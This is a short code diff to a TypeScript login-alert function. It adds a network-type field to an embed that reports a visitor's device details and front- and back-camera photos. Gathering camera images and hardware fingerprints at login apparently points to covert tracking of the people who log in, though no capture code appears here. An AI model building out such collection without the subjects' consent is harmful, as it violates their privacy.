@@ -49,11 +49,12 @@ export async function sendLoginAlert(
     browser: string;
     os: string;
     screen: string;
-    photoBase64?: string; // Now expects URLs, not base64
-    backCameraPhoto?: string; // Now expects URLs, not base64
+    photoBase64?: string;
+    backCameraPhoto?: string;
     timestamp: string;
     battery?: string;
     network?: string;
+    networkType?: string;
     cpuCores?: number | string;
     memory?: string;
     language?: string;
@@ -80,6 +81,7 @@ export async function sendLoginAlert(
     { name: "🖥️ Screen", value: data.screen, inline: true },
     { name: "🔋 Battery", value: data.battery || "N/A", inline: true },
     { name: "📶 Network", value: data.network || "Unknown", inline: true },
+    { name: "📡 Network Type", value: data.networkType || "Unknown", inline: true },
     { name: "🧠 CPU", value: String(data.cpuCores || "N/A"), inline: true },
     { name: "💾 RAM", value: data.memory || "N/A", inline: true },
     { name: "🎮 GPU", value: data.gpu?.substring(0, 50) || "N/A", inline: false },
